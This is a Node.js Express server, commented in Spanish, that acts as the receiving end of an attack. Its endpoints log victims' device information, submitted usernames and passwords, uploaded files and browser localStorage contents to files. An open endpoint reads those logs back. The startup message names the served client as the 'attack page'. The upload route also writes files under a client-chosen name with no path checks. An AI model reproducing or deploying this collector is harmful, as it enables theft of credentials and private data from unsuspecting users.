const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Crear directorio de logs si no existe
fs.ensureDirSync('./logs');

// Ruta para información del dispositivo
app.post('/api/device-info', async (req, res) => {
    try {
        const data = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            data: data
        };
        
        await fs.appendFile('./logs/device_info.log', JSON.stringify(logEntry) + '\n');
        console.log('Información de dispositivo recibida:', data.userAgent);
        
        res.status(200).json({ status: 'success', message: 'Device info received' });
    } catch (error) {
        console.error('Error al guardar device info:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Ruta para contraseñas
app.post('/api/credentials', async (req, res) => {
    try {
        const credentials = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            credentials: credentials
        };
        
        await fs.appendFile('./logs/credentials.log', JSON.stringify(logEntry) + '\n');
        console.log('Credenciales recibidas:', credentials.username);
        
        res.status(200).json({ status: 'success', message: 'Credentials received' });
    } catch (error) {
        console.error('Error al guardar credenciales:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Ruta para archivos
app.post('/api/files', async (req, res) => {
    try {
        const fileData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            file: fileData
        };
        
        await fs.appendFile('./logs/files.log', JSON.stringify(logEntry) + '\n');
        console.log('Archivo recibido:', fileData.name);
        
        // Guardar archivo si es necesario
        if (fileData.content && fileData.name) {
            const buffer = Buffer.from(fileData.content.split(',')[1], 'base64');
            await fs.outputFile(`./uploads/${fileData.name}`, buffer);
        }
        
        res.status(200).json({ status: 'success', message: 'File received' });
    } catch (error) {
        console.error('Error al guardar archivo:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Ruta para datos del localStorage
app.post('/api/localstorage', async (req, res) => {
    try {
        const storageData = req.body;
        const logEntry = {
            timestamp: new Date().toISOString(),
            ip: req.ip,
            storage: storageData
        };
        
        await fs.appendFile('./logs/localstorage.log', JSON.stringify(logEntry) + '\n');
        console.log('Datos de localStorage recibidos');
        
        res.status(200).json({ status: 'success', message: 'LocalStorage data received' });
    } catch (error) {
        console.error('Error al guardar localStorage:', error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Ruta para ver logs (solo para desarrollo)
app.get('/api/logs/:type', (req, res) => {
    const logType = req.params.type;
    const logFiles = {
        'device': './logs/device_info.log',
        'credentials': './logs/credentials.log',
        'files': './logs/files.log',
        'storage': './logs/localstorage.log'
    };
    
    if (logFiles[logType]) {
        try {
            const logs = fs.readFileSync(logFiles[logType], 'utf8');
            res.send(logs);
        } catch (error) {
            res.status(404).send('Log file not found');
        }
    } else {
        res.status(400).send('Invalid log type');
    }
});

// Servir archivos estáticos del cliente
app.use(express.static(path.join(__dirname, '../cliente')));

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
    console.log(`Accede a la página de ataque: http://localhost:${PORT}`);
});
